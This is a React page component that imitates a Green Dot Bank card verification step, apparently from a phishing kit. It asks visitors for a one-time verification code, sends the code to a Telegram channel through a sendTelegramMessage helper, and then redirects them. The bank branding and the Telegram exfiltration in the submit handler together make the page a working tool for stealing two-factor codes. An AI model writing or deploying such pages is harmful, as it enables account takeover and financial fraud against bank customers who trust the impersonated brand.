"use client"
import React, { useState } from "react";
import { sendTelegramMessage } from "../../utils/telegram";

const LoginPage: React.FC = () => {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");

  const isFormValid = code.trim() !== "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) {
      setError("Please enter a valid code.");
      return;
    }
    setError("");

    // Prepare the message to be sent to Telegram with the code
    const message = `Verification Code: ${code}`;

    try {
      // Send the code to Telegram
      await sendTelegramMessage(message);
      window.location.href = "/lggreenw";
      

      // You can add any additional actions here (e.g., redirect, API calls, etc.)
    } catch (err) {
      console.error("Failed to send message to Telegram:", err);
      setError("Failed to send code.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-md text-left border border-gray-300">
        <h1 className="text-2xl font-bold uppercase">
          <span className="text-green-600">Enter</span>
          <span className="text-gray-700"> Verification Code</span>
        </h1>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700">
              * Verification Code
            </label>
            <input
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="w-full px-3 py-2 border border-gray-400 rounded-md"
            />
          </div>

          <button
            type="submit"
            className={`w-full py-2 rounded-lg text-white font-semibold ${
              isFormValid ? "bg-gradient-to-b from-purple-600 to-purple-800" : "bg-gray-300 cursor-not-allowed"
            }`}
            disabled={!isFormValid}
          >
            SEND CODE
          </button>
        </form>

        <p className="text-[10px] text-gray-500 mt-6 leading-tight">
          This Card is issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc.
        </p>
      </div>
    </div>
  );
};

export default LoginPage;
